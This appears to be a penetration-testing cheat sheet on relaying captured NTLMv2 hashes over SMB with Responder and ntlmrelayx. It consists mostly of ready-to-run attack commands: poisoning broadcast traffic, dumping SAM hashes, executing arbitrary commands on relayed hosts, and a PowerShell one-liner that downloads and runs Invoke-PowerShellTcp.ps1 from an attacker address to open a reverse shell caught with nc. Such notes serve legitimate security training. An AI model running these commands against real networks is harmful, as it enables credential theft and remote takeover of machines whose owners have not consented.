# 12.08 ntlmrelayx SMB Relay

> Relay captured NTLMv2 over SMB to signing-disabled hosts — `-c` for arbitrary commands, `-i` for interactive shells on 127.0.0.1.

## Overview

Relay captured NTLMv2 hashes over SMB to targets with signing disabled. Default action is a SAM dump if the relayed account has admin rights. Use -c for arbitrary command execution; for a reverse shell, host a PowerShell payload and catch it with nc. The -i flag launches interactive SMB client shells accessible via nc on 127.0.0.1.

## Steps

- Disable Responder's SMB server (SMB = Off) so ntlmrelayx can handle port 445
- Run Responder to poison broadcast traffic, ntlmrelayx to relay
- Default (no -c): SAM dump if relayed user is local admin
- c 'command': run arbitrary command on target via SMB
- For a reverse shell: host Invoke-PowerShellTcp.ps1 on python3 -m http.server, nc -nvlp listener
- i: start interactive SMB client shells; connect with nc 127.0.0.1 <port>
- Check AdminStatus TRUE in socks list to know which sessions have admin

## Commands

### Disable Responder SMB

```bash
sed -i "s/SMB = On/SMB = Off/" Responder.conf
```

### SAM dump relay

```bash
sudo ntlmrelayx.py -tf relayTargets.txt -smb2support
```

### Command exec relay

```bash
sudo ntlmrelayx.py -tf relayTargets.txt -smb2support -c 'ping -n 1 172.16.117.30'
```

### Reverse shell relay

```bash
sudo ntlmrelayx.py -tf relayTargets.txt -smb2support -c "powershell -c IEX(New-Object NET.WebClient).DownloadString('http://172.16.117.30:8000/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 172.16.117.30 -Port 7331"
```

### Host PS payload

```bash
python3 -m http.server
```

### Catch reverse shell

```bash
nc -nvlp 7331
```

### Interactive SMB shells

```bash
ntlmrelayx.py -tf relayTargets.txt -smb2support -i
```

### Connect to interactive shell

```bash
nc -nv 127.0.0.1 11000
```
